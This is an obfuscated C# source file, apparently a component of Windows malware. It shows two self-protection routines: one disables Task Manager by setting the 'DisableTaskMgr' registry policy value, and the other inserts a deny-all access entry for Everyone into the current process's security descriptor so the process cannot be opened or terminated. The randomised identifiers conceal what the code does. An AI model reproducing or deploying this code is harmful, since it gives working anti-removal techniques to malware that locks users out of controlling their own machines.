using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace oiBbJupDERGF;

internal class RQdEQruvWsDRj
{
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr RoPMdlTJARPkHJ, int FhUguMuhjvPfuOOpIn, [Out] byte[] kMFzrhngBWMXlpw, uint iNfLIDpZnRgW, out uint epxRzamNFwDrbw);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr kBYHcIrVGDKz, int rZNRrjJCQEBgICf, [In] byte[] yrcDLnOYOwPDh);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void dsDednzvacs(bool LCcWOtWLCEvFrLz)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			if (LCcWOtWLCEvFrLz && registryKey.GetValue("DisableTaskMgr") != null)
			{
				registryKey.DeleteValue("DisableTaskMgr");
			}
			else
			{
				registryKey.SetValue("DisableTaskMgr", "1");
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor DFxoKhkIwWSHiQ(IntPtr WxGLdZGYXyqsZ)
	{
		byte[] kMFzrhngBWMXlpw = new byte[0];
		GetKernelObjectSecurity(WxGLdZGYXyqsZ, 4, kMFzrhngBWMXlpw, 0u, out var epxRzamNFwDrbw);
		if ((long)epxRzamNFwDrbw > 32767L)
		{
			throw new Win32Exception();
		}
		if (!GetKernelObjectSecurity(WxGLdZGYXyqsZ, 4, kMFzrhngBWMXlpw = new byte[epxRzamNFwDrbw], epxRzamNFwDrbw, out epxRzamNFwDrbw))
		{
			throw new Win32Exception();
		}
		return new RawSecurityDescriptor(kMFzrhngBWMXlpw, 0);
	}

	private void ksjiFWVuCDB(IntPtr fcmScgXJOxfL, RawSecurityDescriptor ZjuyufnYjNgG)
	{
		byte[] array = new byte[ZjuyufnYjNgG.BinaryLength];
		ZjuyufnYjNgG.GetBinaryForm(array, 0);
		if (!SetKernelObjectSecurity(fcmScgXJOxfL, 4, array))
		{
			throw new Win32Exception();
		}
	}

	public void tRmQMPxzlwI()
	{
		IntPtr currentProcess = GetCurrentProcess();
		RawSecurityDescriptor rawSecurityDescriptor = DFxoKhkIwWSHiQ(currentProcess);
		rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
		ksjiFWVuCDB(currentProcess, rawSecurityDescriptor);
	}
}
